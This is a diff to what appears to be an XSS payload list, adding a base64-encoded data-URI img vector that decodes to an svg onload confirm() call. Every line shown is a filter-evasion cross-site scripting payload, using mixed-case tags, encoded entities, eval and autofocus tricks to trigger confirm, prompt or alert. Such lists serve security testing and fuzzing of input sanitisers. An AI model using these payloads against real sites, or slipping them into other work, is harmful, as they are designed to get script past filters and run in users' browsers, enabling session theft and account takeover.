@@ -24,6 +24,7 @@
 <iMG src onload=%ff%00%ffAAA onerror=confirm() />
 <iMG src="/" =_=" tiTLe="onerror='prompt(1)'">
 <iMG src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
+<iMG src="data:text/html;base64,PHNWZy9vbmxvYWQ9ImNvbmZpcm0oKSI+PHNWZz4=">
 <iNpUt %253e onfocus="&#x000000000000000000000000000000061;lert()" autofocus />
 <iNpUt /&#62; id=""onfocus="window['\a\l\ert']()" autofocus/>
 <iNpUt autofocus="" onfocus=confirm()></iNpUt>
